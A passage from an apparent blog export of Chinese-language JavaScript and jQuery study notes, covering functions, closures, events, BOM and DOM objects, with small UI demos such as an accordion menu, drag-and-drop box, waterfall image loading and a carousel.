            <li><a>分类列表</a></li>
            <li><a>添加分类</a></li>
            <li><a>分类权限</a></li>
        </ul>
        <h3>商品管理</h3>
        <ul>
            <li><a>商品列表</a></li>
            <li><a>添加商品</a></li>
            <li><a>商品黑名单</a></li>
            <li><a>商品权限</a></li>
        </ul>
        <h3>订单管理</h3>
        <ul>
            <li><a>订单列表</a></li>
            <li><a>添加订单</a></li>
            <li><a>订单权限</a></li>
        </ul>
        <h3>系统管理</h3>
        <ul>
            <li><a>系统列表</a></li>
            <li><a>添加系统</a></li>
            <li><a>系统黑名单</a></li>
            <li><a>系统权限</a></li>
        </ul>
    </div>


    <script src="./jquery-3.3.1.min.js"></script>
    <script>
    
        $(function(){
            $('#nav ul').eq(4).show();

            // 事件
            $('#nav h3').click(function(){
                // 展开
                /*$(this)
                .next('ul')
                .slideDown(1000)
                .siblings('ul')
                .slideUp(1000);*/
                $(this)
                .next('ul').slideDown(1000)
                .siblings('ul').slideUp(1000);
            });
        });
        
    </script>
```

# 特效-jq放大镜

```
<head>
	<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
	<title>放大镜</title>
	<script src='./jquery-1.8.3.min.js'></script>
	<script src='jquery.jqzoom-core.js'></script>
	<script>
		$(function(){
			//使用jqzoom
			$('.myclass').jqzoom({
				
			});
		})
	</script>
	<style>
			
	</style>
	<link rel="stylesheet" href="jquery.jqzoom.css">
</head>
<body>
    
		<a href="./images/big01.jpg" class='myclass' title='大图'>
			<img src="./images/small01.jpg" alt="">
		</a>

</body>
```

# PS:jQuyer常见插件总结

1. 五星级评价插件 jRating
    插件主页：http://www.myjqueryplugins.com/jquery-plugin/jrating
2. 流行的图片展示插件 unSlider
    插件主页： http://www.bootcss.com/p/unslider/
3. 相册插件    Galleriffic
    插件主页：http://www.twospy.com/galleriffic/index.html
4. 日期选取插件 Datepicker
    插件主页：http://jqueryui.com/datepicker/
5. 事件日历插件 xGCalendar
    主页 https://github.com/xuanye/xgcalendar
6. 表单插件 JQuery.form
    主页：http://plugins.jquery.com/form/
7. 表单验证插件 jQuery.validate
    主页 http://plugins.jquery.com/validate/
8. 表格插件 jqGrid 和 Flexigird
    主页： http://www.jqgrid.com/
    主页：http://flexigrid.info/
9. 树状列表插件 zTree
    主页：http://www.ztree.me/v3/main.php#_zTreeInfo
10. 对话框插件
    主页：http://www.fancybox.net/
11. 图片放大插件jQzoom
    主页： http://www.oschina.net/p/jqzoom
12. 图片上传插件 jQuery File Upload
13. 网站导航栏插件 jQuery.mmenu
    主页：http://mmenu.frebsite.nl/
14. 可拖放布局插件 gridster.js
    主页：http://gridster.net/
15  页面便条插件 jStickyNode
    主页 http://tympanus.net/codrops/2009/10/30/jstickynote-a-jquery-plugin-for-creating-sticky-notes/]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 基础02-js函数</title>
    <url>/2018/05/22/JavaScript%20%E5%9F%BA%E7%A1%8002-js%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[
# JS 函数

## 1. 函数的声明

1. function 关键字方式
   function 函数名([形参]) {
       JS 代码
   }
2. 表达式方式
   var 函数名 = function([形参]) {
       JS 代码
   }
3. Function 构造函数方式
   var 函数名 = new Function('参数1', 'JS 代码');

## 2. 调用函数

- 加括号才是调用
- 不加括号 是引用 该函数

## 3. JS 函数特点

- 函数没有返回值 默认返回undefined
- 函数可以重复定义的

## 4. JS 函数中的参数

- 形参与实参
  - 实参个数 > 形参个数 多余的实参会被忽略
  - 实参个数 < 形参个数 未赋值的参数 会被自动赋值为 undefined
- 参数的默认值
  - 在函数内部判断 是否是undefined. 做赋值
- 可变参数个数
  - arguments 获取所有传递的是参数,是一个数组对象

## 5. JS 中的变量作用域  全局和局部变量

- 在函数内 使用 var 定义的是 局部变量
- 在函数外 使用 var 定义的是 全局变量
- 在函数内/外 不使用 var 定义的是 全局变量

## 6. JS 的作用域链

函数的执行 依赖于变量的作用域

这个作用域是在 函数定义声明时决定的，而不是 函数调用时决定的！

- 如果当前作用域里 没有声明变量，则向上一层作用域里面找.
- 如果直到找到全局里 还都未找到，则在执行函数时 会报错.



## 7. 自执行函数 与 闭包

### 7.1 自执行

```javascript
( function(){console.log(1)} )()
( function(){console.log(2)} () )
```

这种写法的含义是将函数声明转换成函数表达式，消除了 JS 引擎识别函数表达式和函数声明的歧义.

它告诉 JS 引擎这是一个函数表达式，不是函数声明。并且可以在后面加括号，立即执行函数的内的代码.



### 7.2 闭包

简单说，闭包就是 能够读取 其他函数内部变量的 函数。

由于在 JS 中，只有函数内部的 子函数 才能读取 局部变量，
因此可以把闭包 简单理解成 “定义在一个 函数内部的 函数”。

所以，在本质上，闭包就是将 函数内部 和 函数外部 连接起来的一座桥梁。

闭包的最大用处有两个

1. 一个是可以读取 函数内部的变量，
2. 另一个就是 让这些变量的值 始终保持在内存中。



## 特效-倒计时同意

```
<h3>10s倒计时生效按钮</h3>
<button id="btn" disabled onclick="alert('已同意!')">同意(10)</button>

<script>
    m = 10;
    function showbtn() {
        var  btn = document.getElementById('btn');
        if (m <= 0) {
            btn.disabled = false;
            btn.innerHTML = '同意';
            return;
        }
        btn.innerHTML = '同意('+m+')';
        m--;
        setTimeout("showbtn()", 1000);
    }

    showbtn();

</script>

```





]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 基础03-对象数组事件</title>
    <url>/2018/05/27/JavaScript%20%E5%9F%BA%E7%A1%8003-%E5%AF%B9%E8%B1%A1%E6%95%B0%E7%BB%84%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[
# 1.JS 数组

## 声明数组

- 1 使用 Array() 构造函数方式
  - var list = new Array(); // 空数组
  - var list = new Array(length); // 定义数组 初始长度
  - var list = new Array(v1,v2,v3); // 指定初始值
- 2 JSON 方式 
  - var list = []; // 空数组
  - var list = [v1,v2,v3]; // 指定初始值

## 数组特点

- 不能使用 `[]` 的形式去追加数组元素,想要追加的请使用 push()
- JS数组的下标是连续的, 跳跃着赋值数组元素的话,中间的元素会自动赋值为undefined
- JS 只有索引数组,没有关联数组

## 遍历

- for 适合遍历从页面中获取到的元素集合对象
- for-in  适合遍历对象

## 数组 属性

见手册

## 数组 方法

- 不改变原数组的方法:
  - concat()
  - join()
  - slice()
- 改变原数组的方法:
  - reverse()
  - push()
  - pop()
  - unshift()
  - shift()
  - sort()

------

# 2.JavaScript 的内置对象

## Boolean

Boolean 对象的声明

- 直接赋值
- 转换函数
- 构造函数

------

## Number

Number 对象的声明

- 直接赋值
- 转换函数
- 构造函数

Number的属性

Number的方法

------

## String

String 对象的声明

- 直接赋值
- 转换函数
- 构造函数

String 的属性

String 的方法

------

## RegExp

RegExp 对象的声明

- 直接赋值
- RegExp 构造函数

RegExp的方法

RegExp 示例

------

## Date

获取 date 对象

获取 date 中的信息

设置 date

------

## Math

Math 的属性

Math 的方法

------

## Array

已学习



# 3.JavaScript 事件

### 1. 事件的绑定

- 事件作为 元素的属性

```javascript
<tagName event="JS code..."></tagName>
```

- 事件作为 元素对象的属性

```javascript
element.onclick = function(){}
element.onclick = funName;
```

- 事件监听(标准)

```javascript
非IE: element.addEventListener('event', funName, false);
IE:   element.attachEvent('onevent', funName);
```

### 2. 解除绑定

- 第1种和第2种的绑定方式

```javascript
element.event = function(){}
element.event = null;
```

- 监听方式

```javascript
非IE: element.removeEventListener('event', funName, false);
IE:   element.detachEvent('onevent', funName);
```

### 3. 给一组元素绑定事件和this的使用

- 循环绑定事件,获取触发事件的元素对象时,需要使用 this
- 元素内部绑定事件时 传入this, 表示该元素对象自己

### 4. 闭包 closure

- 在循环绑定事件时,将循环变量保留下来时,就需要使用闭包
- 用一组元素 去控制另一组元素时,建议使用闭包
- 语法:

```javascript
for( ... ) {
    (function (i,x,y){
        element.event = function(){
            // 使用 i,x,y
        }
    })(i,x,y);
}
```

### 5. 常用事件

#### 5.1 鼠标事件

- onclick       单击触发
- ondblclick    双击触发
- oncontextmenu 右击触发/return false阻止系统菜单
- onmouseover   鼠标指向触发
- onmouseout    鼠标移开触发
- onmousedown   鼠标按下触发
- onmouseup     鼠标松开触发
- onmousemove   鼠标移动触发

#### 5.2 键盘事件

- onkeydown     按下按键触发
- onkeyup       松开按键触发
- onkeypress    按下并松开触发(JS高级事件)
      不是所有的按键都能触发,无输出的按键 就不能触发
      (方向键/shift/alt/ctrl/tab/大小写)

#### 5.3 表单事件

- onsubmit   表单被提交时触发
- onreset    表单被重置时触发
- onfocus    获取焦点时触发
- onblur     失去焦点时触发
- onchange   改变表单控件的内容或状态时就触发
      `用于input元素时,value值变化且失焦才触发`
- oninput           非IE: 输入时输入时(input/textarea)
- onpropertychange  IE: 输入时输入时(input/textarea)
- onselect   选中时触发

#### 5.4 框架/对象事件

- onload    文档加载完触发/图片加载完触发
- onunload  文档关闭时触发 IE
- onbeforeunload  文档关闭时触发 非IE
  `浏览器阻止了关闭前的弹框 需要return "string..."`
- onabort   图片加载过程中中断触发
- onerror   图片加载错误触发
- onresize  窗口/框架大小变化时触发
- onscroll  元素滚动条在滚动时触发

#### 5.5 其他事件

- oncopy   拷贝内容时触发
- oncut    剪切内容时触发
- onpaste  粘贴内容时触发
- onplay   音/视频开始播放时触发(audio/video)
- onpause  音/视频暂停时触发(audio/video)
- onended  音/视频播放结束时触发(audio/video)

// Chrome 73+  自动处理 play 状态
// https://www.tuicool.com/articles/J363M3v

### 6. Event 事件对象

#### 6.1 获取

事件内部 传入 en 获取使用
`var en = en || window.event;`

#### 6.2 属性

```javascript
en.x/en.clientX 鼠标的x坐标
en.y/en.clientY 鼠标的y坐标
en.button       鼠标的按键码: 0左键/1中键/2右键/3后退键/4前进键
en.offsetX      鼠标相对于触发事件元素的 x 坐标
en.offsetY      鼠标相对于触发事件元素的 y 坐标
```

### 7. 常用HTML元素属性

```javascript
    innerHTML   双标签之间的文本

    当前元素 相对与body 或已定位的父元素的 偏移量
    offsetTop
    offsetLeft

    当前元素 左边缘或顶边缘 滚过的像素值
    scrollTop
    scrollLeft

    className   当前元素的class属性值
    tagName     当前元素的标签名
```



------

# PS.补充

> JS 中的随机数的产生.
>
> > Math.random() 函数 返回 0 和 1 之间的伪随机数
> > 可能为 0, 但总是小于 1

```javascript
// 生成 min-max,包含 min 但不包含 max 的整数:
parseInt(Math.random() * (max-min) + min, 10);

// 生成min-max,不包含 min 但包含 max 的整数:
Math.floor(Math.random() * (max-min) + min) + 1;

// 生成 min-max,不包含 min 和 max 的整数:
Math.round(Math.random() * (max-min) + min + 1);

// 生成min-max ,包含 min 和 max 的随机数:
Math.round(Math.random() * (max-min)+min);
Math.floor(Math.random() * ((max-min)+1) + min);
```



# 特效-下载进度条

```
<body>
    <h1>下载进度条</h1>
    <hr>
    <button onclick="start()" id="but">开始下载</button>
    <div id="container">
    	<div id="color">
    		<span id="tip"></span>
    	</div>
    </div>
    
    <script>
		//获取color的宽度
		var container=document.getElementById('container');
		var color=document.getElementById('color');
        var tip=document.getElementById('tip');
		var but=document.getElementById('but');
                console.log(but.onclick);
        // 设置每次调用设置color宽度
        var w=0;
        function download(){
                color.style.width=w+'%';
                w++;
                tip.innerHTML=(w-1)+'%';
                but.onclick=stop;
                but.innerHTML='暂停下载';
                console.log(but.onclick);
    			if (w>100) {
    				clearInterval(c1);
					// alert('下载完成');
					tip.innerHTML='下载完成';
                    but.innerHTML='下载完毕';
                    but.onclick=start;
    			}
    	}

    	// 点击start开启定时器
    	function start(){
    		if (w<100) {
    			c1 = setInterval('download()',50)	
    		}
    	}
        function stop(){
            clearInterval(c1);
            but.onclick=start;
            but.innerHTML='继续下载';
            console.log(but.onclick);
        }
    </script>

```

# 特效-图层拖拽

```
<head>
    <meta charset="UTF-8">
    <title>图层拖拽</title>
    <style>
    	#box{
    		width: 100px;
    		height: 100px;
    		border: 1px solid #000;
    		position: absolute;
    	}
    </style>
</head>
<body>
    <h1>图层拖拽</h1>
    <hr>
    
    
	<div id="box">
		
	</div>

	<script>	
		var box = document.getElementById('box');
		box.onmousedown = function(en){
			var en = en || window.event;
			box.style.background='#00eef3';
			box.innerHTML='按住';
    		console.log(box.style);
			document.onmousemove = function(env){
				var env = env || window.event;
				box.style.top=env.y-en.offsetY+'px';
				box.style.left=env.x-en.offsetX+'px';
	    		console.log(box.style.top);
	    		console.log(box.style.left);
			}
		}

		document.onmouseup = function(){
			box.style.background = '#fff';
			box.innerHTML='松开';
			document.onmousemove = null;
		}

	</script>

</body>
```

# 特效-地址联动

```
    <h1>JS onchange 地址联动实例</h1>
    <hr>

    <select name="con" id="con"></select>
    <select name="city" id="city"></select>

    <script>
    // 声明数组
    // 国家的信息
    var conList = ['中国', '美国', '英国', '日本', '德国'];

    // 城市的信息 二维数组
    var cityList = new Array();
    cityList[0] = ['北京', '上海', '天津', '重庆', '南京'];
    cityList[1] = ['纽约', '洛杉矶', '芝加哥', '旧金山', '华盛顿'];
    cityList[2] = ['伦敦', '伯明翰', '曼彻斯特', '剑桥', '爱丁堡'];
    cityList[3] = ['东京', '北海道', '福冈县', '广岛', '大阪'];
    cityList[4] = ['柏林', '汉堡', '慕尼黑', '科隆', '法兰克福'];

    // 获取下拉框 填充国家或城市
    
    var con = document.getElementById('con');
    var city = document.getElementById('city');
    // console.log(con, city);
    
    // 填充国家下拉框选项
    for (var i = 0; i < conList.length; i++) {
        // con.innerHTML += '<option value="'+i+'">'+conList[i]+'</option>';
        con.add(new Option(conList[i], i));
    }

    // 绑定onchange事件到第一个下拉框之上
    con.onchange = function () {
        // 清空之前的选项
        // city.innerHTML = '';
        city.options.length = 0;

        // 根据value值 获取被选中的option信息
        var index = con.value;
        // console.log(index);
        // 根据索引值,去取出对应的城市信息
        var citys = cityList[index];
        // console.log(citys);

        // 填充城市信息
        for (var i = 0; i < citys.length; i++) {
            city.add(new Option(citys[i], i));
        }
    }

    // 手动触发onchange一次
    con.onchange();
    </script>
```

# 特效-resize事件

```
   <h1>JS onresize  事件</h1>
    <hr>

    <div id="box"></div>

    <script>
        window.onresize = function(){
            box.innerHTML = Math.random();
            // 随机背景颜色
            // // rgb(0,0,0)  ~ rgb(255,255,255)
            // var r = Math.floor(Math.random() * 100000 % 256);
            // var g = Math.floor(Math.random() * 100000 % 256);
            // var b = Math.floor(Math.random() * 100000 % 256);
            // console.log(r,g,b);
            // document.body.style.backgroundColor = 'rgb('+r+','+g+','+b+')';

            // 0~9a~f >>> [0,1,2,3,4,....e,f]
            // #000000 ~ #ffffff
            var color = '#' + Math.floor(Math.random() * 16777215).toString(16);
            document.body.style.backgroundColor = color;

            // 2147483647   int
            // 10485760   =>  10M
            // 1048576   =>  1M
        }
    
    </script>
```



]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 基础04-JS BOM</title>
    <url>/2018/06/10/JavaScript%20%E5%9F%BA%E7%A1%8004-BOM/</url>
    <content><![CDATA[
# BOM

### 1. 什么是BOM

Browser Object Model  浏览器对象模型

### 2. JavaScript 对象层次

#### 2.1 对象种类

- 自定义对象 Obejct
- 内置对象 A/S/N/B/M/D/R/G
- BOM 浏览器对象模型
- DOM 文档对象模型

#### 2.2 对象树 (倒树状结构)

```
                    window
                       |
history   location  document  screen   navigator
                        |
                doc       html
                           |
                    head         body
                      |           |
                mate  link      div p li  span ...
```

### 3. BOM 对象

#### 3.1 window

- 描述整个浏览器窗口的
- 它是JS中 所有对象的根对象
- 使用window的属性和方法时,可以省略window的调用
- 自定义对象/变量/函数
- 属性: 见手册
- 方法:
  - setInterval() 按照指定的周期（以毫秒计）来调用函数或计算表达式。 
  - setTimeout() 在指定的毫秒数后调用函数或计算表达式。 
  - clearInterval() 取消由 setInterval() 设置的 timeout。 
  - clearTimeout() 取消由 setTimeout() 方法设置的 timeout。 
  - alert()    警告框
  - confirm()  确认框
  - prompt()   输入框
  - open()     打开新窗口
  - close()    关闭窗口,只能关闭自己打开过的窗口
  - print()    打印
  - srcollTo() 滚到哪去
  - srcollBy() 滚多少

#### 3.2 history

- 属性: length
- 方法:
  - back()
  - forward()
  - go()

#### 3.3 location

- 属性:
  - href
  - protocol
  - hostname
  - host
  - pathname
  - search
  - hash
- 方法:
  - reload()
  - assign()
  - replace()

#### 3.4 screen

- 属性
  - width   屏幕宽度
  - height   屏幕高度

#### 3.5 navigator



# window操作

```
    <h1>window</h1>
    <hr>
    <button onclick="run()">打个招呼</button>

    <hr>
    <button onclick="window.open()">打开一个新窗口</button>
    <button onclick="window.open('http://www.163.com')">open : 163.com</button>
    <button onclick="window.open('http://m.baidu.com','', 'width=300,height=600')">open(指定大小)</button>
    <button onclick="window.open('http://m.toutiao.com','jianjian')">open(指定在哪个窗口打开)</button>


    <button onclick="window.close()">关闭窗口</button>
    <button onclick="window.print()">打印</button>

    <script>
    window.name = 'jianjian';


    var obj = {name:"静静"}

    console.log(obj);
    console.log(window.obj);

    var a = 110;
    console.log(window.a);

    function demo(){
        console.log('呆毛...');
    }

    window.demo();

    // - alert()    警告框
    // var a = alert('警告框');
    // console.log(a); // undefined
    // - confirm()  确认框
    // var a = confirm('确认框');
    // console.log(a); // true/false
    // - prompt()   输入框
    // var a = prompt('请输入您的银行卡密码:');
    // console.log(a); // ...

    // if (confirm('你喜欢球吗??')) {
    //     alert('好巧,我也喜欢!');
    // } else {
    //     alert(prompt('为什么不喜欢???'));
    // }
    
    function run(){
        do {
            // 弹出输入框
            var name = prompt('您贵姓?');
            //  确认信息框
            var content = confirm('您输入的是: [ ' + name + ' ]\n,是否确认?');
        } while (!content);

        alert('Hi~ o(*￣▽￣*)ブ,  小'+ name+name);
    }

    </script>
```

# history操作

```
    <h1>history</h1>
    <hr>

    <button onclick="history.back()">上一步(后退)</button>
    <button onclick="history.forward()">下一步(前进)</button>

    <button onclick="history.go(1)">下一步</button>
    <button onclick="history.go(-2)">上2步</button>

    <script>
    console.log(window.history);

    console.log(history.length); // 当前本页面打开过的历史记录数量

    </script>
```



# location操作

```
    <h1>location</h1>
    <hr>

    <button onclick="location.reload()">刷新</button>

    <!-- JS 跳转一个页面 -->
    <button onclick="location.assign('http://acfun.cn')">assign</button>
    <button onclick="location.replace('http://bilibili.com')">replace</button>
    <button onclick="location.href='http://xiazaiav.com'">href</button>

    <script>
    // console.log(window.location);
    console.log('URL: ' + location.href);

    console.log('协议: ' + location.protocol);
    console.log('主机名: ' + location.hostname);
    console.log('主机名+端口号: ' + location.host);

    console.log('路径: ' + location.pathname);
    console.log('参数: ' + location.search);
    console.log('锚点: ' + location.hash);

    // location.href = 'http://acfun.cn';
    // location.search = '?age=18';
    location.hash = '#p18';



    </script>
```

# screen-navigator操作

```
    <h1>screen / navigator</h1>
    <hr>


    <script>
    console.log(window.screen);
    console.log(window.screen.availHeight);
 
    console.log(window.navigator);
    console.log(window.navigator.appVersion);
    console.log(window.navigator.userAgent);

    // 检测用户的终端设备
    
    var browser = {
        versions: (function(){
            var u = navigator.userAgent;
            var app = navigator.appVersion; 
            return {
                trident: u.indexOf('Trident')     > -1,                                   // IE内核
                presto : u.indexOf('Presto')      > -1,                                   // Opera内核
                webKit : u.indexOf('AppleWebKit') > -1,                                   // 苹果谷歌内核
                gecko  : u.indexOf('Gecko')       > -1 && u.indexOf('KHTML') == -1,       // 火狐内核
                mobile : !!u.match(/AppleWebKit.*Mobile.*/) || !!u.match(/AppleWebKit/),  // 是否为移动端
                ios    : !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),                      // ios终端
                android: u.indexOf('Android')     > -1 || u.indexOf('Linux') > -1,        // android终端 或 uc浏览器
                iPhone : u.indexOf('iPhone')      > -1 || u.indexOf('Mac') > -1,          // 是否为iPhone 或 QQHD浏览器
                iPad   : u.indexOf('iPad')        > -1,                                   // 是否为iPad
                webApp : u.indexOf('Safari')      == -1                                   // 是否为web应用程序,没有头部和底部
            };
        })()
    }

    document.write('是否为移动端:' + browser.versions.mobile + '<br>');
    document.write('是否为ios端:' + browser.versions.ios + '<br>');
    document.write('是否为android终端:' + browser.versions.android + '<br>');
    document.write('是否为chrome浏览器:' + browser.versions.webKit + '<br>');
    document.write('是否为FireFox浏览器:' + browser.versions.gecko + '<br>');

    </script>
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>JS BOM</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 基础05-JS DOM</title>
    <url>/2018/06/21/JavaScript%20%E5%9F%BA%E7%A1%8005-DOM/</url>
    <content><![CDATA[
# DOM

## 1. DOM基本介绍

DOM 是 Document Object Model 文档对象模型

- HTML DOM
- XML DOM

## 2. HTML DOM 对象参考

- 2.1 document 对象
  - 属性: 
    - domain
    - lastModified
    - referrer
    - URL
    - cookie
    - 集合属性all 获取所有元素(IE中为true,非IE为false)
  - 方法: 

- 2.2 form 对象
  属性:

  ```
  -length 元素个数
  -elements 元素数组
  ```

  方法:
      - submit() 提交指定的表单
      - reset()  重置指定的表单
  事件:
          -onsubmit="return false"    阻止提交表单,submit()方法可绕过
          -onreset="return false"     阻止重置表单,reset()方法可绕过

- 2.3 image 对象

- 2.4 anchor 对象

- 2.5 base 对象

- 2.6 canvas 对象
  http://echarts.baidu.com/

- 2.7 Event 对象

- 2.8 input 系列对象

  - blur()
  - focus()
  - select()
    复制 flash或clipboard.js组件

- 2.9 select 对象

- 2.10 option 对象

- 2.11 style 对象

- 2.12 table 对象

- 2.13 tableRow 对象

- 2.14 tableCell 对象

## 3.XML DOM 节点

### 1.节点介绍

- 1.1 什么是节点 node

HTML 文档中 所有的组成部分 称之为节点

- doucment  文档
- element   标签
- attr      属性 (attribute)
- comment   注释
- text      文本
- 1.2 节点树
  子节点
  父节点
  同辈节点
  后代节点
  先辈节点
- 1.3 节点的访问
  - 得到节点
    - doucment  文档
      document
    - element   标签
      ByID...
    - attr      属性 (attribute)
      getAttributeNode(attrname)
    - comment   注释
      子节点
    - text      文本
      子节点
  - 获取子节点
    childNodes
  - 获取子元素节点
    children
  - 获取第一个子节点
    firstChild
  - 获取最后一个子节点
    lastChild
  - 获取父节点
    parentNode
  - 获取父元素节点
    parentElement
  - 获取前一个节点
    previousSibling
  - 获取后一个节点
    nextSibling

- 1.4 节点属性
  - nodeName 
    - doucment  #document
    - element   标签名
    - attr      属性名
    - text      #text
    - comment   #comment
  - nodeValue 
    - doucment  null
    - element   null
    - attr      属性值
    - text      文本内容
    - comment   注释内容
  - nodeType 
    - doucment  9
    - element   1
    - attr      2
    - text      3
    - comment   8

### 2.节点操作

2.1 获取节点

- element   ById/子节点/父节点/同辈节点/后代
- attr      getAttributeNode('attrname');  获取属性节点
      element.attr; 获取属性值
      getAttribute('attrname');  获取属性值

2.2 改变节点(改变节点的值) nodeValue

- element   无意义
- attr      
      setAttribute('attrname', 'value');
      element.attr = value;

2.3 删除节点

- attr      removeAttribute('attrname');
- element   把值赋值为空 或 removeChild(node) 需要找到父节点

2.4 替换节点

- attr      setAttribute('attrname', 'value');
- element   replaceChild(new_node, old_node)  需要找到父节点

2.5 插入节点

- attr      
      setAttribute('attrname', 'value');
      setAttributeNode('attrname');
- element   
      appendChild(node)   追加
      insertBefore(new_node, old_node)      指定位置

2.6 创建节点

- attr      document.createAttribute(attrname);
- element   document.createElement('tagName');

2.7 克隆节点

- cloneNode()  参数默认为false / 可选 true



### 3. XML 对象

- node
- nodeList
- document
- element
- attr
- text
- comment

### 4. HTMLElement对象

```
className   类名

scrollLeft  滚动条至 左边界像素
scrollTop   滚动条至 上边界像素

offsetLeft  距离已定位父元素的 左偏移量
offsetTop   距离已定位父元素的 上偏移量

innerHTML   元素内部的内容(不含标签)
innerText   元素内部所有的文本内容
outerHTML   元素的内容(含标签)

offsetWidth  盒子模型,实际的宽: 内容+内边距+边框
offsetHeight  盒子模型,实际的高: 内容+内边距+边框

clientWidth  宽 + 内边距
clientHeight 高 + 内边距

scrollWidth  宽 + 内边距 + 计算里面元素的大小
scrollHeight 高 + 内边距 + 计算里面元素的大小

document.documentElement.clientHeight  视口高度
document.documentElement.scrollHeight  文档高度
```

# PS. 补充

- PS1. DOM 元素对象的 属性和方法
  http://www.runoob.com/jsref/dom-obj-all.html
- PS2. MDN文档
  - Mozilla 开发者社区(MDN):
    https://developer.mozilla.org/zh-CN/
  - JavaScript MDN文档
    https://developer.mozilla.org/zh-CN/docs/Web/JavaScript

# 特效-全选复制按钮

```
    <h1>input</h1>
    <hr>

    <input type="text" id="s"> <button>百度一下</button>

    <hr>
    <br>
    
    <button onclick="selectAll()">全选</button>
    <button onclick="copyAll()">全选复制</button>

    <button class="btn" data-clipboard-target="#content">全选复制(clip)</button>
    <br>
    <br>
    <textarea name="weibo" id="content" cols="40" rows="10">诗人对宇宙人生，须入乎其内，又须出乎其外。入乎其内，故能写之。出乎其外，故能观之。入乎其内，故有生气。出乎其外，故有高致。美成能入而不出。白石以降，于此二事皆未梦见。</textarea>


    <script src="./clipboard.min.js"></script>
    <script>
    s.focus();

    function selectAll(){
        content.select();
    }

    function copyAll(){
        // 判断 剪切板对象 是否可用
        if (window.clipboardData) {
            // IE
            window.clipboardData.setData('text', content.value);
            alert('已复制到剪切板!');
        } else {
            // 非IE
            content.select();
            alert('请按 Ctrl + C 复制!');
        }
    }

    var clipboard = new ClipboardJS('.btn');

    clipboard.on('success',function(e){
        console.log(e);
        alert('已复制到剪切板(clip)');
    });


    </script>
```

# 特效-瀑布流效果

```
    <h1>瀑布流效果</h1>
    <hr>
    
    <div id="imglist">
        <img c-src="./imgs/mm021.jpg">
        <img c-src="./imgs/mm022.jpg">
        <img c-src="./imgs/mm023.jpg">
        <img c-src="./imgs/mm024.jpg">
        <img c-src="./imgs/mm025.jpg">
        <img c-src="./imgs/mm026.jpg">
        <img c-src="./imgs/mm027.jpg">
        <img c-src="./imgs/mm028.jpg">
        <img c-src="./imgs/mm029.jpg">
        <img c-src="./imgs/mm030.jpg">
        <img c-src="./imgs/mm031.jpg">
        <img c-src="./imgs/mm032.jpg">
        <img c-src="./imgs/mm033.jpg">
        <img c-src="./imgs/mm034.jpg">
        <img c-src="./imgs/mm035.jpg">
        <img c-src="./imgs/mm036.jpg">
        <img c-src="./imgs/mm037.jpg">
        <img c-src="./imgs/mm038.jpg">

    </div>

    <script>
   	var picNum = 3
    setTimeout('loadPic(picNum)',1000);
    var imgs = imglist.children;

	function loadPic(x){
		// 获取所有图片节点
    	console.log(cl);
    	var i = 0;
    	var cl = setInterval(function(){
    		imgs[i].setAttribute('src',imgs[i].getAttribute('c-src'));
    		console.log(i);
    		i++;
    		if (i >= x) {
    			clearInterval(cl);
    		}
    	},10)

    }

    // if (true) {}
    
    window.onscroll = function(){
    	
	    var clientY = document.documentElement.clientHeight;
	    var scrollY = document.documentElement.scrollHeight;
	    var top = document.documentElement.scrollTop;
	    console.log(top);
	    if (scrollY-clientY-1000 <= top) {
	    	picNum+=1;
	    	console.log(picNum);
	    	loadPic(picNum);

	    }
    }

    </script>
```

]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>JS DOM</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 特效</title>
    <url>/2018/06/21/JavaScript%20%E7%89%B9%E6%95%88/</url>
    <content><![CDATA[
## 特效扩展

### 银行卡自动截断

```
    <h1>请输入银行卡:</h1>
    <hr>

    <input type="text" id="bankCard" maxlength="23">

    <script>
        var input = document.getElementById('bankCard');

        if (document.all) {
            input.onpropertychange = ckInput;
        } else {
            input.oninput = ckInput;
        }


        function ckInput(){
            // 将输入范围限定在数字范围之内
            // A: 
            /*input.value = input.value
                .replace(/\D/g, '')
                .replace(/(\d{4})/g, '$1-')
                .replace(/-$/g, '');*/
            // B: 
            input.value = input.value
                .replace(/\D/g, '')
                .replace(/(\d{4})(?=\d)/g, '$1-')
        }

        /*
        (?:)    忽略子模式的匹配
        (?=)    正向预查/先行断言
                匹配过程中,需要用到这个子模式的条件
                但是,获取匹配结果时,忽略该子模式的条件
         */

    </script>
```



### 轮播图(Banner)

```
<head>
    <meta charset="UTF-8">
    <title>轮播图</title>
    <style>
		*{
			list-style:none;
		}
		#box{
			width: 400px;
			height: 300px;
			margin: 0 auto;
			border: 1px solid #000;
		}
		#container{
			position:relative;
		}
    	#imglist img{
    		width: 400px;
    		height: 300px;
    	}
    	#iconlist{
    		position: absolute;
    		right:110px;
    		bottom:10px;
    	}
    	#iconlist ul li{
    		width: 30px;
    		height: 30px;
    		border-radius: 50%;
    		float: left;
    		background: rgba(0,200,255,0.4);
    		line-height: 30px;
    		text-align: center;
    		margin-left: 10px;
			cursor: pointer;
    	}


    </style>
</head>
<body>
    <h1>轮播图</h1>
    <hr>
    
    <div id="box">
    	<div id="container">
    		<div id="imglist">
    			<img src="./imgs/mm041.jpg" style="display:block">
    			<img src="./imgs/mm042.jpg" style="display:none">
    			<img src="./imgs/mm043.jpg" style="display:none">
    			<img src="./imgs/mm044.jpg" style="display:none">
    			<img src="./imgs/mm045.jpg" style="display:none">
    		</div>
    		<div id="iconlist">
    			<ul>
    				<li style="color:red;background: rgba(0,255,255,1);">1</li>
    				<li>2</li>
    				<li>3</li>
    				<li>4</li>
    				<li>5</li>
    			</ul>
    		</div>
    	</div>
		<button onclick="previous()">previous</button>
		<button onclick="next()">next</button>
    </div>


    <script>
    	
    	var imgs = imglist.children;
    	var lis = document.getElementsByTagName('li');
    	console.log(lis);

    	var t = 0;
    	function run(){
	    	t++;
    		if (t>=imgs.length) {
